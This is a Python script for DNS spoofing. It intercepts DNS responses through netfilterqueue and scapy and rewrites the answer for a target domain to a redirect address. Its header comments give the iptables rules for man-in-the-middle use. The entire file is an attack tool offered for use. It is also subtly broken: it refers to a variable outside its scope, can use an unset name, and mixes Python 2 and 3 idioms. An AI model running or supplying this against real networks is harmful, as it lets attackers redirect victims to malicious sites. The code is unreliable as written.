# #!/usr/bin/python2.7
# #"iptables -I INPUT -j NFQUEUE --queue-num 0" for localhost dns-spoofing iptables cmd to create a queue
# #"iptables -I FORWARD -j NFQUEUE --queue-num 0" for MITM mode but it has some bug 

import os
import sys
import netfilterqueue
import argparse
import scapy.all as scapy

class DNSSpoof:
  def __init__(self) -> None:
    try:
      self.TargetWebsite = None
      self.RedirectWebsite = None

    except Exception as e:
      exc_type, exc_obj, exc_tb = sys.exc_info()
      fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
      print(exc_type, fname, exc_tb.tb_lineno)
      print(exc_obj)

  def ReadArguments(self):
    try:
      parser = argparse.ArgumentParser()
      parser.add_argument(
        "-s",
        "--spoof",
        dest = "swebsite",
        help = "Specify an website to spoof"
      )
      parser.add_argument(
        "-r",
        "--redirect",
        dest = "dwebsite",
        help = "Specify an website to redirect the user"
      )
      options = parser.parse_args()

      self.TargetWebsite = options.swebsite
      self.RedirectWebsite = options.dwebsite

    except Exception as e:
      exc_type, exc_obj, exc_tb = sys.exc_info()
      fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
      print(exc_type, fname, exc_tb.tb_lineno)
      print(exc_obj)

  def process_packet(self, packet):
    try:
      scapy_packet = scapy.IP(packet.get_payload())

      if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname

      if options.swebsite + "." == qname:
        print("[+] Spoofing Target")
        answer = scapy.DNSRR(
          rrname = qname,
          rdata = self.RedirectWebsite
        )
        scapy_packet[scapy.DNS].an = answer
        scapy_packet[scapy.DNS].ancount = 1

        del scapy_packet[scapy.IP].len
        del scapy_packet[scapy.IP].chksum
        del scapy_packet[scapy.UDP].chksum
        del scapy_packet[scapy.UDP].len

        packet.set_payload(str(scapy_packet))

      packet.accept()

    except Exception as e:
      exc_type, exc_obj, exc_tb = sys.exc_info()
      fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
      print(exc_type, fname, exc_tb.tb_lineno)
      print(exc_obj)

  def run(self):
    try:
      queue = netfilterqueue.NetfilterQueue()
      queue.bind(0, self.process_packet)
      queue.run()

    except Exception as e:
      exc_type, exc_obj, exc_tb = sys.exc_info()
      fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
      print(exc_type, fname, exc_tb.tb_lineno)
      print(exc_obj)

if __name__ == "__main__":
  p = DNSSpoof()
  p.ReadArguments()
  p.run()
